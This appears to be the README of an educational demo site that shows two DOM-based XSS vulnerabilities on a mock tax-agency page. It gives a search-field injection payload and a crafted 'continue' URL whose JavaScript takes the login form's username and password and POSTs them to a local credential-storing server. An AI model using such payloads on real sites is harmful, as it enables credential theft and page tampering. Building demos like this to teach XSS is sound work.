# No Man's Land Revenue Agency 

This is a demo of two DOM-based XSS vulnerabilities in a specifically crafted for this purpose website.
Imagine you're in No Man's Land and you need to access their revenue agency in order to fill in some tax statements...

## Instructions

To get started, navigate to No Man's Land Revenue Agency home page: https://mtsanovv.github.io/nomanslandra/frontend/index.html

- To inject malicious code via html element, open the search page and put the following string in the query input field and then press 'Search':
```article');$("#search").append("<img src=\"https://media.tenor.com/7XnVtgeQv4EAAAAC/money-pool-rich.gif\"/><iframe width=\"1\" height=\"1\" src=\"https://www.youtube.com/embed/_w7Ft_JTbH4?autoplay=1&loop=1\"><\/iframe>");console.log('```

- To inject malicius code via url:
    1. Create a MySQL database using the ```storeCredentials.sql``` file from the ```backend``` directory and grant ```SELECT/INSERT/UPDATE/DELETE``` privileges for it to some user
    2. Navigate to the ```backend``` directory and configure the MySQL properties in ```server.js``` (make sure to use the user from step 1)
    3. Run ```node server.js``` (you may need to run first ```npm install express mysql cors``` in the ```backend``` directory)
    4. Navigate to the following URL: ```https://mtsanovv.github.io/nomanslandra/frontend/login.html?continue=$.ajax({contentType:%27application/json%27,type:%27POST%27,url:%27http://localhost:3000/storeCredentials%27,data:JSON.stringify({username:$(%27input:eq(0)%27).val(),password:$(%22input:eq(1)%22).val()})});$(%22article%22).first().append(%27%3Cimg%20src=%22https://media.tenor.com/7XnVtgeQv4EAAAAC/money-pool-rich.gif%22/%3E%3Ciframe%20width=%221%22%20height=%221%22%20src=%22https://www.youtube.com/embed/_w7Ft_JTbH4?autoplay=1%22%3E%3C/iframe%3E%27);console.log```

# Notes
- Created for educational purposes only and to demonstrate how bad XSS can be
- This is the unencoded JavaScript code for the 'continue' parameter in the malicious URL:
```$.ajax({contentType:'application/json',type:'POST',url:'http://localhost:3000/storeCredentials',data:JSON.stringify({username:$('input:eq(0)').val(),password:$("input:eq(1)").val()})});$("article").first().append('<img src="https://media.tenor.com/7XnVtgeQv4EAAAAC/money-pool-rich.gif"/><iframe width="1" height="1" src="https://www.youtube.com/embed/_w7Ft_JTbH4?autoplay=1"></iframe>');console.log```
- The website is based on Telephasic by HTML5UP!
- Malicious code nspired by: https://btvnovinite.bg/bulgaria/shegadzhii-udariha-sajta-na-nap.html

# License
Creative Commons Attribution 3.0 Unported
http://creativecommons.org/licenses/by/3.0/

*M.Tsanov, 2023*
